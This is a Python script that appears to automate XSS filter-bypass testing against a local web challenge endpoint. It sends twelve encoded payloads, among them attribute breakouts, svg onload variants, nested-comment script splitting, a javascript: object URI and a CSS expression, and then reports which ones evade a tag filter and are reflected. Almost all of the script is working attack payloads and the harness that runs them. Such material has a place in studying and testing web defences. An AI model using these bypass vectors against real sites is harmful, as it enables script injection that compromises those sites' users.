import requests
import urllib.parse
import re

# Target URL and endpoint
base_url = "http://127.0.0.1:33204"
endpoint = "/page"

# Vectors to test - each is a tuple (name, payload)
vectors = [
    ("Attribute breakout", ">\"<input type=text value=XSS onfocus=alert('XSS') autofocus"),
    ("Obsolete isindex tag", "<isindex type=image src=x onerror=alert('XSS')>"),
    ("Custom xss element", "<xss onload=alert('XSS')>"),
    ("Nested comment", "<scr<!--test-->ipt>alert('XSS')</script>"),
    ("Whitespace variant 1", "<svg/onload=alert('XSS')>"),
    ("Whitespace variant 2", "<svg onload=alert('XSS')>"),
    ("After-tag attribute", "onload=alert('XSS')"),
    ("HTML entity in tag", "<svg&#x20;onload=alert('XSS')>"),
    ("CDATA variant", "<svg><![CDATA[<script>alert('XSS')]]></svg>"),
    ("JS protocol in data element", "<object data=javascript:alert('XSS')>"),
    ("CSS expression", "<div style=\"width:expression(alert('XSS'))\">"),
    ("Decimal character reference", "&#60;img src=x onerror=alert('XSS')&#62;")
]

print("=" * 60)
print("XSS Filter Bypass Testing")
print("=" * 60)
print()

results = []

for vector_name, payload in vectors:
    # URL encode the payload for safe transmission
    encoded_payload = urllib.parse.quote(payload, safe='')
    
    # Construct URL
    url = f"{base_url}{endpoint}?name={encoded_payload}"
    
    try:
        # Send GET request
        response = requests.get(url, timeout=10)
        
        # Check for filter block message
        blocked = "Sorry, you can't use that tag" in response.text
        
        # Check if payload was reflected
        reflected = payload in response.text or urllib.parse.unquote(payload) in response.text
        
        # Check response length
        response_length = len(response.content)
        
        # Extract the reflected portion if possible
        reflected_match = None
        if reflected:
            # Try to find where the payload appears
            pattern = re.compile(r'name(?:=|%3D)[^&]*?(' + re.escape(payload) + r')[^&]*', re.I)
            match = pattern.search(response.text)
            if match:
                reflected_match = match.group(0)
        
        # Check for XSS execution indicators
        xss_indicator = "alert('XSS')" in response.text and not blocked
        
        result = {
            'name': vector_name,
            'payload': payload,
            'encoded': encoded_payload,
            'status': response.status_code,
            'length': response_length,
            'blocked': blocked,
            'reflected': reflected,
            'xss_indicator': xss_indicator
        }
        results.append(result)
        
        # Print detailed results
        print(f"[+] Vector: {vector_name}")
        print(f"[+] Payload: {payload}")
        print(f"[+] Status: {response.status_code} | Length: {response_length}B")
        print(f"[+] Blocked: {blocked}")
        print(f"[+] Reflected: {reflected}")
        print(f"[+] XSS Indicator: {xss_indicator}")
        
        # If blocked, show error context
        if blocked:
            print(f"[+] Filter message detected")
        
        # If reflected, show what was reflected
        if reflected_match:
            print(f"[+] Reflected context: {reflected_match[:200]}")
        
        # Check content around reflection point
        if reflected and not blocked and xss_indicator:
            print(f"[!] POTENTIAL SUCCESS - Payload not blocked and XSS string present")
        
        print()
        
    except Exception as e:
        print(f"[!] Error testing {vector_name}: {str(e)}")
        print()

print("=" * 60)
print("Summary")
print("=" * 60)

# Analyze results
blocked_count = sum(1 for r in results if r['blocked'])
reflected_count = sum(1 for r in results if r['reflected'])
potential_success = sum(1 for r in results if r['xss_indicator'] and not r['blocked'])

print(f"Total vectors tested: {len(vectors)}")
print(f"Blocked by filter: {blocked_count}")
print(f"Reflected: {reflected_count}")
print(f"Potential XSS indicators: {potential_success}")
print()

if potential_success > 0:
    print("[!] SUCCESSFUL VECTORS FOUND:")
    for r in results:
        if r['xss_indicator'] and not r['blocked']:
            print(f"  - {r['name']}: {r['payload']}")
else:
    print("[-] No successful bypasses yet - need to refine vectors")

print()
print("Individual response data:")
for r in results:
    print(f"{r['name']:25} | Status: {r['status']} | Length: {r['length']:4}B | Blocked: {str(r['blocked']):5} | Reflected: {str(r['reflected']):5} | XSS: {str(r['xss_indicator']):5}")
